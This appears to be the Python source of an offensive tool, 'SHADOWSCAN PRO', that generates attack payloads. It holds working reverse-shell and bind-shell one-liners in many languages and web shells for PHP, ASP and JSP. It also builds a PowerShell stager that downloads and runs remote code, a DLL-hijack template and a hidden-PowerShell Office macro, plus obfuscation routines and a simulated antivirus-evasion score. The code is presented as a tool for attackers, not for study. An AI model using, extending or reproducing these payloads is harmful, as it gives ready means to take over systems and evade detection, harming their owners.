"""
SHADOWSCAN PRO - Payload Generator
Generates custom payloads for various platforms
Developed by ROHAIB TECHNICAL | +92 306 3844400
"""

import base64
import random
import string
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import hashlib


@dataclass
class Payload:
    """Generated payload"""
    name: str
    payload_type: str
    platform: str
    architecture: str
    payload: str
    encoded_payload: str
    size: int
    obfuscated: bool
    detection_ratio: float
    listener_command: Optional[str] = None


class PayloadGenerator:
    """Advanced payload generator with evasion capabilities"""
    
    # Payload templates
    TEMPLATES = {
        "reverse_shell": {
            "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
            "python": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'',
            "php": 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "powershell": '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
            "nc": 'nc -e /bin/sh {LHOST} {LPORT}',
            "node": 'require("child_process").exec("nc -e /bin/sh {LHOST} {LPORT}")',
            "ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            "perl": 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
            "java": 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()',
        },
        "bind_shell": {
            "bash": 'nc -lvp {LPORT} -e /bin/sh',
            "python": 'python -c \'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",{LPORT}));s.listen(1);c,a=s.accept();import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh"])\'',
            "powershell": '$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{LPORT});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()',
        },
        "meterpreter": {
            "windows": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x86/meterpreter/reverse_tcp",
            "android": "android/meterpreter/reverse_tcp",
        },
        "web_shell": {
            "php_simple": '<?php system($_GET["cmd"]); ?>',
            "php_advanced": '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
            "asp": '<%eval request("cmd")%>',
            "aspx": '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>',
            "jsp": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        }
    }
    
    # Obfuscation techniques
    OBFUSCATION = {
        "base64": lambda x: base64.b64encode(x.encode()).decode(),
        "hex": lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
        "url": lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        "rot13": lambda x: x.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
        )),
        "xor": lambda x, key=42: ''.join(chr(ord(c) ^ key) for c in x),
    }
    
    def __init__(self):
        self.generated_payloads: List[Payload] = []
    
    def generate(
        self,
        payload_type: str,
        platform: str,
        lhost: str,
        lport: int,
        obfuscate: bool = True,
        obfuscation_method: str = "base64",
        encoder: str = "none"
    ) -> Optional[Payload]:
        """Generate a payload"""
        
        if payload_type not in self.TEMPLATES:
            return None
        
        templates = self.TEMPLATES[payload_type]
        
        if platform not in templates:
            # Try to find closest match
            if "linux" in platform.lower() and "bash" in templates:
                platform = "bash"
            elif "windows" in platform.lower() and "powershell" in templates:
                platform = "powershell"
            else:
                return None
        
        payload_template = templates[platform]
        
        # Replace placeholders
        raw_payload = payload_template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
        
        # Apply encoding
        encoded_payload = raw_payload
        if encoder != "none":
            encoded_payload = self._encode_payload(raw_payload, encoder)
        
        # Apply obfuscation
        final_payload = encoded_payload
        if obfuscate:
            final_payload = self._obfuscate(encoded_payload, obfuscation_method)
        
        # Calculate detection ratio (simulated)
        detection_ratio = self._calculate_detection_ratio(final_payload, obfuscate)
        
        # Generate listener command
        listener_command = self._generate_listener_command(payload_type, platform, lport)
        
        payload = Payload(
            name=f"{payload_type}_{platform}_{lport}",
            payload_type=payload_type,
            platform=platform,
            architecture="x64" if "64" in platform else "x86",
            payload=raw_payload,
            encoded_payload=final_payload,
            size=len(final_payload.encode()),
            obfuscated=obfuscate,
            detection_ratio=detection_ratio,
            listener_command=listener_command
        )
        
        self.generated_payloads.append(payload)
        
        return payload
    
    def generate_powershell_empire(self, lhost: str, lport: int, 
                                   staging: bool = True) -> Payload:
        """Generate PowerShell Empire stager"""
        
        if staging:
            stager = f'''
            $wc=New-Object System.Net.WebClient;
            $u='Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
            $wc.Headers.Add('User-Agent',$u);
            $wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
            $wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
            IEX $wc.DownloadString('http://{lhost}:{lport}/launcher')
            '''
        else:
            stager = f'''
            $K=[System.Text.Encoding]::ASCII.GetBytes('YOUR_BASE64_PAYLOAD');
            $R={[System.Reflection.Assembly]::Load($K)};
            $E=$R.EntryPoint;
            $E.Invoke($null,(,$null))
            '''
        
        raw_payload = stager.replace("{lhost}", lhost).replace("{lport}", str(lport))
        
        # Obfuscate
        obfuscated = self._obfuscate_powershell(raw_payload)
        
        return Payload(
            name=f"empire_stager_{lport}",
            payload_type="powershell_empire",
            platform="windows",
            architecture="any",
            payload=raw_payload,
            encoded_payload=obfuscated,
            size=len(obfuscated.encode()),
            obfuscated=True,
            detection_ratio=0.15,
            listener_command=f"powershell -ep bypass -c \"{obfuscated[:100]}...\""
        )
    
    def generate_msfvenom(self, payload_name: str, lhost: str, lport: int,
                          encoder: str = "x86/shikata_ga_nai", iterations: int = 5) -> Payload:
        """Generate msfvenom-style payload"""
        
        # Simulated msfvenom output
        payloads = {
            "windows/shell_reverse_tcp": b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30",
            "linux/x86/shell_reverse_tcp": b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80",
            "android/meterpreter/reverse_tcp": b"\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00",
        }
        
        shellcode = payloads.get(payload_name, b"\x90" * 50)
        
        # Encode shellcode
        encoded_shellcode = base64.b64encode(shellcode).decode()
        
        raw_payload = f"msfvenom -p {payload_name} LHOST={lhost} LPORT={lport} -e {encoder} -i {iterations} -f raw"
        
        return Payload(
            name=f"msf_{payload_name.replace('/', '_')}",
            payload_type="meterpreter",
            platform=payload_name.split('/')[0],
            architecture="x86",
            payload=raw_payload,
            encoded_payload=encoded_shellcode,
            size=len(shellcode),
            obfuscated=True,
            detection_ratio=0.35,
            listener_command=f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload_name}; set LHOST {lhost}; set LPORT {lport}; exploit'"
        )
    
    def generate_dll_hijack(self, target_process: str, lhost: str, lport: int) -> Payload:
        """Generate DLL hijacking payload"""
        
        dll_template = '''
        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
            if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
                // Reverse shell code here
                WinExec("powershell -ep bypass -c \\"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});...\\"", 0);
            }}
            return TRUE;
        }}
        '''
        
        payload_code = dll_template.format(LHOST=lhost, LPORT=lport)
        
        return Payload(
            name=f"dll_hijack_{target_process}",
            payload_type="dll_hijack",
            platform="windows",
            architecture="x64",
            payload=payload_code,
            encoded_payload=base64.b64encode(payload_code.encode()).decode(),
            size=len(payload_code.encode()),
            obfuscated=False,
            detection_ratio=0.45,
            listener_command=f"nc -lvnp {lport}"
        )
    
    def generate_macro_payload(self, lhost: str, lport: int) -> Payload:
        """Generate VBA macro payload for Office documents"""
        
        macro = f'''
        Sub AutoOpen()
            Dim str As String
            str = "powershell -ep bypass -w hidden -c $c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
            CreateObject("WScript.Shell").Run str, 0, False
        End Sub
        '''
        
        return Payload(
            name="office_macro",
            payload_type="vba_macro",
            platform="windows",
            architecture="any",
            payload=macro,
            encoded_payload=base64.b64encode(macro.encode()).decode(),
            size=len(macro.encode()),
            obfuscated=False,
            detection_ratio=0.55,
            listener_command=f"nc -lvnp {lport}"
        )
    
    def _encode_payload(self, payload: str, encoder: str) -> str:
        """Encode payload with specified encoder"""
        if encoder == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoder == "hex":
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif encoder == "url":
            return ''.join(f'%{ord(c):02x}' for c in payload)
        return payload
    
    def _obfuscate(self, payload: str, method: str) -> str:
        """Obfuscate payload"""
        if method in self.OBFUSCATION:
            return self.OBFUSCATION[method](payload)
        
        # Multi-layer obfuscation
        obfuscated = payload
        for _ in range(3):
            method = random.choice(list(self.OBFUSCATION.keys()))
            obfuscated = self.OBFUSCATION[method](obfuscated)
        
        return obfuscated
    
    def _obfuscate_powershell(self, script: str) -> str:
        """Specialized PowerShell obfuscation"""
        # Variable substitution
        vars_map = {
            'New-Object': '&("New-Ob"+"ject")',
            'System.Net.Sockets.TCPClient': '[System.Net.Sockets.TCPClient]',
            'WebClient': '&("Web"+"Client")',
        }
        
        obfuscated = script
        for original, replacement in vars_map.items():
            if random.random() > 0.5:
                obfuscated = obfuscated.replace(original, replacement)
        
        # Add junk comments
        junk = '#' + ''.join(random.choices(string.ascii_letters, k=10))
        lines = obfuscated.split('\n')
        obfuscated = '\n'.join(f"{line} {junk}" if random.random() > 0.7 else line for line in lines)
        
        return obfuscated
    
    def _calculate_detection_ratio(self, payload: str, obfuscated: bool) -> float:
        """Calculate estimated detection ratio (simulated)"""
        base_ratio = 0.6
        
        if obfuscated:
            base_ratio *= 0.3
        
        # Check for common signatures
        signatures = ["cmd.exe", "powershell", "eval", "exec", "system", "socket", "connect"]
        for sig in signatures:
            if sig in payload.lower():
                base_ratio += 0.05
        
        return min(1.0, base_ratio)
    
    def _generate_listener_command(self, payload_type: str, platform: str, lport: int) -> str:
        """Generate listener command for the payload"""
        if "reverse" in payload_type:
            return f"nc -lvnp {lport}"
        elif payload_type == "meterpreter":
            return f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {platform}/meterpreter/reverse_tcp; set LPORT {lport}; exploit'"
        elif payload_type == "web_shell":
            return f"Start a web server and access the shell at http://target/shell.php?cmd=whoami"
        else:
            return f"Set up listener on port {lport}"
    
    def get_payload_stats(self) -> Dict:
        """Get statistics about generated payloads"""
        return {
            "total_generated": len(self.generated_payloads),
            "by_type": {
                ptype: len([p for p in self.generated_payloads if p.payload_type == ptype])
                for ptype in set(p.payload_type for p in self.generated_payloads)
            },
            "by_platform": {
                plat: len([p for p in self.generated_payloads if p.platform == plat])
                for plat in set(p.platform for p in self.generated_payloads)
            },
            "avg_detection_ratio": sum(p.detection_ratio for p in self.generated_payloads) / len(self.generated_payloads) if self.generated_payloads else 0,
            "obfuscation_rate": len([p for p in self.generated_payloads if p.obfuscated]) / len(self.generated_payloads) if self.generated_payloads else 0
        }
    
    def export_payload(self, payload: Payload, format: str = "raw") -> str:
        """Export payload in specified format"""
        if format == "raw":
            return payload.payload
        elif format == "base64":
            return payload.encoded_payload
        elif format == "hex":
            return payload.payload.encode().hex()
        elif format == "c":
            hex_str = payload.payload.encode().hex()
            return f'unsigned char payload[] = "{hex_str}";'
        elif format == "python":
            return f'payload = "{payload.encoded_payload}"'
        elif format == "powershell":
            return f'[System.Convert]::FromBase64String("{payload.encoded_payload}")'
        else:
            return payload.payload